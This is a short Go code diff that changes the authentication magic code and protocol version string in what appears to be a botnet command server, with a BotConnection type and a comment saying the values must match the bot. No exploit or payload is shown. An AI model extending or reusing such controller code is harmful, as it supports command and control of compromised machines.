@@ -25,8 +25,8 @@ const (
 	USER_SERVER_PORT = "420"
 
 	// Authentication  these must match bot
-	MAGIC_CODE       = "avxy59r1#MSk^bBK"
-	PROTOCOL_VERSION = "V3_1"
+	MAGIC_CODE       = "2$IicIfr@vY9ureJ"
+	PROTOCOL_VERSION = "proto57"
 )
 
 type BotConnection struct {
